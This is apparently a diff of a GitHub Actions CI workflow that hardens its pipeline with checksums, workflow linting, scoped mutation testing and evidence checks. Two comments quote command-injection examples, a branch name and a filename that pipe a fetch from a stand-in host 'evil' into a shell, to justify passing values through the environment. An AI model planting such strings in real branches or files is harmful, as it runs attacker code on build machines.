@@ -4,6 +4,12 @@ on:
   push:
     branches: [main, v1]
   pull_request:
+  # The combination, not the branch. Two pull requests that each pass alone can fail
+  # together — one renames what the other calls — and a repository whose only gate is the
+  # pull request merges both and learns on main. Every job below runs under this event as
+  # well, because none of them is conditioned on the event name, and `CI Result` counts a
+  # skipped job as a failure precisely so that a lane cannot go quiet here.
+  merge_group:
 
 permissions:
   contents: read
@@ -24,6 +30,12 @@ env:
   # The linux_amd64 line from the official actionlint_1.7.12_checksums.txt. The version
   # says which release we asked for; the checksum says the bytes we got are that release.
   ACTIONLINT_SHA256: "8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8"
+  # The other two, from the same publishers' own checksum files, read on 2026-08-16 with the
+  # owner's consent for that one network call. Until this, actionlint was the only download
+  # whose bytes were checked: the version said which release we asked for and nothing said
+  # the bytes we got were that release, on the two engines whose whole job is to find things.
+  GITLEAKS_SHA256: "551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb"
+  TRIVY_SHA256: "2edd39da482bb4e9831962487b68f68e3928ec3137794757f54d00383d79547b"
   PIP_AUDIT_VERSION: "2.10.1"
   MYPY_VERSION: "2.3.0"
   SNYK_VERSION: "1.1306.3"
@@ -47,8 +59,10 @@ jobs:
       - name: install just and the scanners
         run: |
           curl -sSfL -o gitleaks.tgz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
+          echo "${GITLEAKS_SHA256}  gitleaks.tgz" | sha256sum -c -
           tar -xzf gitleaks.tgz gitleaks && sudo install gitleaks /usr/local/bin/
           curl -sSfL -o trivy.tgz "https://github.com/aquasecurity/trivy/releases/download/v${TRIVY_VERSION}/trivy_${TRIVY_VERSION}_Linux-64bit.tar.gz"
+          echo "${TRIVY_SHA256}  trivy.tgz" | sha256sum -c -
           tar -xzf trivy.tgz trivy && sudo install trivy /usr/local/bin/
           curl -sSfL -o actionlint.tgz "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
           echo "${ACTIONLINT_SHA256}  actionlint.tgz" | sha256sum -c -
@@ -56,6 +70,20 @@ jobs:
           uv tool install semgrep==1.172.0
           uv tool install zizmor==1.17.0
           uv tool install "rust-just==${JUST_VERSION}"
+
+      # Two readers, because they disagree on purpose. actionlint knows what GitHub will
+      # accept; zizmor knows what an attacker will do with what GitHub accepts.
+      #
+      # Before the gate, not after it, and that ordering is the whole point. These two read
+      # files and need nothing built, so putting them last bought nothing and cost this:
+      # every run where `just check` failed skipped them, so on a branch that had never been
+      # green they had never executed at all. Their first run found two real findings in a
+      # workflow written weeks earlier. A check that only runs once everything else passes
+      # reports on the days it was least needed.
+      - name: workflows are a language too, and the most attacked one
+        run: |
+          actionlint
+          uv tool run zizmor .github/workflows/
 
       - name: the gate, exactly as a developer runs it
         run: just check | tee "$RUNNER_TEMP/check.log"
@@ -75,13 +103,6 @@ jobs:
           path: coverage.xml
           if-no-files-found: error
 
-      # Two readers, because they disagree on purpose. actionlint knows what GitHub will
-      # accept; zizmor knows what an attacker will do with what GitHub accepts.
-      - name: workflows are a language too, and the most attacked one
-        run: |
-          actionlint
-          uv tool run zizmor .github/workflows/
-
       # The day that stopped being true was 2026-08-09: spec 006 declared rich and
       # questionary, and five more arrived behind them. So this step now has something to
       # find, and the export is checked before the audit reads it — `pip-audit --strict`
@@ -100,13 +121,67 @@ jobs:
           PY
           uv run --no-project --with "pip-audit==${PIP_AUDIT_VERSION}" pip-audit --strict -r requirements.txt
 
+      # `ai-eng doctor --ci` cannot exit 0, on any commit, and it is not supposed to. `--ci`
+      # counts every check a runner cannot answer as unanswered, unanswered is INCOMPLETE,
+      # and "not evaluated is never green" is the rule this whole product is about. So the
+      # step as written — the command alone, its exit code taken as the verdict — was a step
+      # that could never pass. It went unnoticed because every earlier failure in this job
+      # ran out of road before reaching it.
+      #
+      # What a runner can gate on is the other half of the same report: nothing FAILED here.
+      # The readable report goes into the log for a person, and the JSON one is what decides.
       - name: is the system healthy
         run: |
           uv tool install --editable .
-          ai-eng doctor --ci
+          ai-eng doctor --ci || true
+          ai-eng --json doctor --ci > "$RUNNER_TEMP/doctor.json" || true
+          uv run --no-project python - "$RUNNER_TEMP/doctor.json" <<'PY'
+          import json, sys
 
+          report = json.load(open(sys.argv[1], encoding="utf-8"))
+          remaining = report.get("remaining", [])
+          decided = [line for line in remaining if not line.endswith("could not be evaluated")]
+          print(f"{report['outcome']}: {len(decided)} decided faults, "
+                f"{len(remaining) - len(decided)} unanswerable on a runner")
+          for line in decided:
+              print(f"  {line}")
+          sys.exit(1 if decided else 0)
+          PY
+
+      # The seal first, and this is what makes the line under it a check rather than a
+      # formality. Events live in an in-flight buffer until a session ends; on a runner no
+      # session ever ends, so the chain was never created and `audit verify` answered
+      # CHAIN_MISSING — INCOMPLETE, exit 1, on every commit. Both halves were wrong: the
+      # step could not pass, and had it passed it would have verified nothing.
+      #
+      # `SessionEnd` through the real dispatcher, exactly as a surface fires it, seals what
+      # this job actually recorded. Then `verify` reads a chain with this run's own links in
+      # it, which is the only version of that question worth asking.
       - name: the record is intact
-        run: ai-eng audit verify
+        run: |
+          echo '{"hook_event_name":"SessionEnd"}' | python3 hooks/chain.py SessionEnd
+          ai-eng audit verify
+
+      # The claim, checked where the diff is. A branch that holds no claim is not a branch
+      # that passed: it says "not applicable" and says it out loud, because a quiet pass and
+      # a real one look identical in a log six weeks later. The claim is read from the
+      # remote rather than from the branch, which is the one copy both sides can see.
+      - name: the branch stayed inside the claim it took
+        env:
+          ITEM: ${{ github.head_ref || github.ref_name }}
+          # A branch name is attacker-supplied text, and an expression inside a run block is
+          # pasted into the script before bash ever sees it — so a branch called
+          # `x";curl evil|sh;"` would run. Through the environment it stays one string that
+          # bash quotes. zizmor calls this template-injection and rates it high; it was
+          # right, and it had never run here to say so.
+          BASE_REF: ${{ github.base_ref || 'main' }}
+        run: |
+          if [ -z "$(git ls-remote origin "refs/ai-eng/claims/$ITEM")" ]; then
+            echo "no claim is held for $ITEM: not applicable"
+            exit 0
+          fi
+          git fetch --no-tags origin "+refs/heads/${BASE_REF}:refs/gate/base"
+          ai-eng spec checkpoint --base refs/gate/base --item "$ITEM"
 
   suite:
     runs-on: ubuntu-latest
@@ -122,6 +197,7 @@ jobs:
       - name: install gitleaks
         run: |
           curl -sSfL -o gitleaks.tgz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
+          echo "${GITLEAKS_SHA256}  gitleaks.tgz" | sha256sum -c -
           tar -xzf gitleaks.tgz gitleaks && sudo install gitleaks /usr/local/bin/
       - name: every attack, and a clean control it must not fire on
         run: uv run python tests/adversarial/run.py
@@ -133,6 +209,10 @@ jobs:
   mutation:
     runs-on: ubuntu-latest
     timeout-minutes: 30
+    permissions:
+      contents: read
+      # To read when the scheduled whole-tree run last completed. Nothing here writes.
+      actions: read
     steps:
       - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
         with:
@@ -140,21 +220,150 @@ jobs:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
+          # The whole history, because this job asks what the branch changed and a shallow
+          # clone has no merge base to ask it against.
+          fetch-depth: 0
       - uses: astral-sh/setup-uv@cec208311dfd045dd5311c1add060b2062131d57 # v8.0.0
       - name: install gitleaks and just
         run: |
           curl -sSfL -o gitleaks.tgz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
+          echo "${GITLEAKS_SHA256}  gitleaks.tgz" | sha256sum -c -
           tar -xzf gitleaks.tgz gitleaks && sudo install gitleaks /usr/local/bin/
           uv tool install "rust-just==${JUST_VERSION}"
-      - name: break it on purpose and fail if nothing notices
-        run: just mutate | tee "$RUNNER_TEMP/mutate.log"
+      # The diff, not the tree. Measured on 2026-08-16: the whole tree is 20,816 mutants and
+      # 121 minutes, against the 30 this job was capped at — so it never finished, never
+      # printed a score, and was reported as `cancelled` on every commit. The whole tree now
+      # runs on a schedule in `mutation-nightly.yml`; this runs over what the branch changed.
+      - name: which product files this branch changed
+        id: changed
+        env:
+          BASE_REF: ${{ github.base_ref || 'main' }}
+        run: |
+          git fetch --no-tags --depth=200 origin "+refs/heads/${BASE_REF}:refs/mutate/base"
+          # Every name checked against one shape before it goes anywhere near a shell. A
+          # path comes out of somebody's branch, and a file called `x; curl evil | sh` is a
+          # legal filename — the whole reason the value travels through the environment
+          # below rather than through a workflow expression, which the runner substitutes
+          # before bash ever parses the line.
+          #
+          # This comment used to quote that expression's own syntax, and quoting it inside a
+          # `run:` block is enough to make the whole workflow invalid: the runner reads the
+          # script for expressions and does not care that this one is inside a `#`. The file
+          # then fails to start, which is not a failing job — it is a run with no jobs at
+          # all, named after the file, and every other job in it silently never happens.
+          paths=""
+          while read -r name; do
+            [ -z "$name" ] && continue
+            case "$name" in
+              src/*.py) ;;
+              *) echo "refusing a changed path that is not a product module: $name" >&2; exit 1 ;;
+            esac
+            printf '%s' "$name" | grep -qE '^src/[A-Za-z0-9_/.-]+\.py$' ||
+              { echo "refusing a changed path with an unexpected character: $name" >&2; exit 1; }
+            paths="${paths}${name} "
+          done <<< "$(git diff --name-only refs/mutate/base...HEAD -- 'src/*.py')"
+          # And a bound, because "the diff" is not always small. Measured on 2026-08-16:
+          # 2.9 mutants a second, 20,816 mutants over 32 modules, so a module averages 650
+          # and this job's 30 minutes buys roughly 4,300 after setup — six modules. A branch
+          # wider than that is a whole-tree run wearing a diff's name, and the honest answer
+          # is to say so in one line rather than die at the cap with nothing printed, which
+          # is what the lane did for weeks. It refuses rather than waving the branch through:
+          # a gate you can escape by touching more files is not a gate, and a change this
+          # wide wants splitting anyway.
+          count=$(printf '%s' "$paths" | wc -w | tr -d ' ')
+          if [ "$count" -gt 6 ]; then
+            # Too wide to measure here, and that is a fact about this branch rather than a
+            # defect in it. Failing was the wrong answer: it made a red nobody could clear
+            # from inside the branch, and a red nobody can clear is a red everybody learns
+            # to ignore — which costs more than the measurement it was protecting.
+            #
+            # So it hands the question to the whole-tree run and says so out loud. The
+            # `wide` output is what the step below reads to decide whether a nightly receipt
+            # has to be there: the honest reading of "we did not measure this diff" is that
+            # something else must have measured the tree, not that nothing needs to.
+            echo "this branch changes ${count} product modules and this lane measures six." >&2
+            echo "Handed to the whole-tree run; a fresh receipt from it is required below." >&2
+            echo "wide=true" >> "$GITHUB_OUTPUT"
+            echo "paths=" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          echo "wide=false" >> "$GITHUB_OUTPUT"
+          echo "paths=${paths}" >> "$GITHUB_OUTPUT"
+          echo "changed: ${paths:-<none>} (${count} of at most 6)"
 
-      # The same reader the check job uses, asked a different question. Its RAN line lives
-      # in this job's log and never reaches the other one, so without this call the whole
-      # mutation gate could stop running and no other job would be able to tell.
-      # `PARTIAL` is what a scoped run prints, so a partial run cannot satisfy this.
+      # The receipt, read from the server rather than from the branch, because the branch is
+      # what is being judged. `anti_theatre` accepts a scoped run only against a whole-tree
+      # run that actually completed inside its window — not one that passed, which would mean
+      # requiring the whole standing backlog cleared before anything could merge.
+      - name: when the whole tree was last measured
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh api "repos/${GITHUB_REPOSITORY}/actions/workflows/mutation-nightly.yml/runs?per_page=1&status=completed" \
+            --jq '.workflow_runs[0] | {name, status, conclusion, completed_at}' \
+            > "$RUNNER_TEMP/nightly.json" || echo '{}' > "$RUNNER_TEMP/nightly.json"
+          cat "$RUNNER_TEMP/nightly.json"
+
+      - name: break it on purpose and fail if nothing notices
+        if: steps.changed.outputs.paths != ''
+        env:
+          CHANGED: ${{ steps.changed.outputs.paths }}
+        run: |
+          read -ra modules <<< "$CHANGED"
+          just mutate "${modules[@]}" | tee "$RUNNER_TEMP/mutate.log"
+
+      # The same reader the check job uses, asked a different question. Its line lives in this
+      # job's log and never reaches the other one, so without this call the whole mutation
+      # gate could stop running and no other job would be able to tell.
       - name: it has to prove it ran
-        run: uv run python tests/anti_theatre.py "$RUNNER_TEMP/mutate.log" . mutants
+        if: steps.changed.outputs.paths != ''
+        run: |
+          uv run python tests/anti_theatre.py "$RUNNER_TEMP/mutate.log" . mutants \
+            "$RUNNER_TEMP/nightly.json"
+
+      # A branch too wide to measure here is covered by the whole-tree run or it is covered by
+      # nothing, and "covered by nothing" must not read like a pass. So the receipt is
+      # required in exactly that case: a nightly that completed inside its window. Absent or
+      # stale, this fails and says which — which is a red somebody can clear, unlike the
+      # refusal it replaced.
+      - name: the whole-tree run has to have covered it
+        if: steps.changed.outputs.wide == 'true'
+        run: |
+          uv run python - "$RUNNER_TEMP/nightly.json" <<'PY'
+          import json, sys
+          from datetime import UTC, datetime
+
+          from tests.anti_theatre import WHOLE_TREE_MAX_AGE_HOURS
+
+          try:
+              run = json.loads(open(sys.argv[1], encoding="utf-8").read())
+          except (OSError, ValueError):
+              run = {}
+          finished = run.get("completed_at")
+          if not finished:
+              sys.exit(
+                  "this diff is too wide for the scoped lane and no whole-tree run has "
+                  "completed, so nothing has measured it.\n"
+                  "Run `mutation nightly` from the Actions tab, or split the change.\n"
+                  "If that workflow is not listed there, this is the bootstrap case: the "
+                  "platform only registers a workflow once it is on the default branch, so "
+                  "the run that would satisfy this check cannot happen until the branch "
+                  "carrying it merges. That is a one-time admin merge, not a standing "
+                  "exemption, and every branch after it is covered normally."
+              )
+          age = (datetime.now(UTC) - datetime.fromisoformat(finished)).total_seconds() / 3600
+          if age > WHOLE_TREE_MAX_AGE_HOURS:
+              sys.exit(f"the whole-tree run is {age:.0f}h old, past {WHOLE_TREE_MAX_AGE_HOURS}h")
+          print(f"the whole tree was measured {age:.0f}h ago: {run.get('conclusion')}")
+          PY
+
+      # A branch that changes no product file has nothing to mutate, and saying so is not the
+      # same as passing. It is the answer the claim gate already gives one job below: not
+      # applicable, out loud, because a quiet pass and a real one look identical in a log six
+      # weeks later. The scheduled run still measures the whole tree either way.
+      - name: not applicable
+        if: steps.changed.outputs.paths == '' && steps.changed.outputs.wide != 'true'
+        run: echo "no product file changed on this branch, so there is nothing to mutate"
 
   # Blocking on both halves, and no baseline file. A type error in `hooks/` is a guard
   # that raises instead of deciding, and @guard turns a raise into a denial — so the
@@ -222,10 +431,12 @@ jobs:
           SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
         run: uv run python tests/quality_gate.py
 
-  # Two things are true at once: a real vulnerability must fail the build, and a throttled
-  # or unauthenticated Snyk must not wedge every merge behind somebody else's billing.
-  # So quota, rate-limit and auth failures downgrade to a warning and everything else
-  # fails. Only the SAST half runs, and the reason changed on 2026-08-09 rather than going
+  # A real vulnerability must fail the build, and a throttled or unauthenticated Snyk must
+  # not report a finding it never looked for. So quota, rate-limit and auth failures stop
+  # this job claiming evidence and everything else fails here. They do not buy a green:
+  # the aggregate below reads `evidence` and blocks, because a lane that observed nothing
+  # is INCOMPLETE and INCOMPLETE is not a pass — including on a fork, where the cure is to
+  # re-home the branch rather than to lower the bar. Only the SAST half runs, and the reason changed on 2026-08-09 rather than going
   # away: it used to be that `snyk test` would scan an empty requirements file, and now
   # there are seven packages to scan. They already have two readers — pip-audit against the
   # advisory databases in the `check` job, and trivy over `uv.lock` in `just security` — so
@@ -234,6 +445,11 @@ jobs:
   # semgrep, and that is where the quota goes.
   snyk:
     name: Snyk Security
+    # What this job observed, not merely whether it exited zero. A job that skipped its
+    # scan and reported success is missing evidence wearing a green tick, and the aggregate
+    # below cannot tell the two apart from a job result alone.
+    outputs:
+      evidence: ${{ steps.scan.outputs.evidence || 'unavailable' }}
     runs-on: ubuntu-latest
     timeout-minutes: 15
     steps:
@@ -258,6 +474,7 @@ jobs:
         if: steps.token.outputs.present == 'true'
         run: npm install -g "snyk@${SNYK_VERSION}" --ignore-scripts
       - name: Snyk code test
+        id: scan
         if: steps.token.outputs.present == 'true'
         env:
           SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
@@ -267,9 +484,11 @@ jobs:
           rc=$?
           printf '%s\n' "$out"
           if [ "$rc" -ne 0 ] && printf '%s' "$out" | grep -qiE 'test limit|increase your tests|rate.?limit|429|too many requests|authentication (error|failed)|not authori|quota'; then
+            echo "evidence=unavailable" >> "$GITHUB_OUTPUT"
             echo "::warning title=Snyk non-blocking::Snyk was unavailable (quota or auth), not silent. semgrep and the adversarial suite still ran."
             exit 0
           fi
+          echo "evidence=ran" >> "$GITHUB_OUTPUT"
           exit "$rc"
 
   # The context branch protection requires. Without it, a job that stops running — renamed,
@@ -286,8 +505,14 @@ jobs:
       - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
         with:
           egress-policy: audit
+      # A green tick means every job ran and every job passed. It does not yet mean every
+      # job observed anything: a lane whose credentials were withheld exits zero having
+      # scanned nothing. So the aggregate reads the evidence a job reports as well as its
+      # result, and says INCOMPLETE out loud rather than letting the absence pass as a pass.
       - name: every job ran, and every job passed
         env:
+          SNYK_EVIDENCE: ${{ needs.snyk.outputs.evidence }}
+          FORK: ${{ github.event.pull_request.head.repo.fork }}
           RESULTS: >-
             check=${{ needs.check.result }}
             suite=${{ needs.suite.result }}
@@ -305,4 +530,13 @@ jobs:
             echo "::error title=CI Result::a job did not report success. A skipped job counts as a failure: a gate nobody notices stopping is a gate that is already gone."
             exit 1
           fi
-          echo "six jobs, six successes"
+          printf '  %-12s %s\n' "snyk evidence" "${SNYK_EVIDENCE:-unavailable}"
+          if [ "${SNYK_EVIDENCE:-unavailable}" != "ran" ]; then
+            if [ "$FORK" = "true" ]; then
+              echo "::error title=CI Result INCOMPLETE::SAST evidence is missing. GitHub withholds secrets from a fork pull request and no code on this branch can change that, so this run cannot say whether the SAST lane found anything. INCOMPLETE blocks; re-home the branch to this repository to get the evidence."
+            else
+              echo "::error title=CI Result INCOMPLETE::SAST evidence is missing on a run that should have had it."
+            fi
+            exit 1
+          fi
+          echo "six jobs, six successes, and every lane observed something"
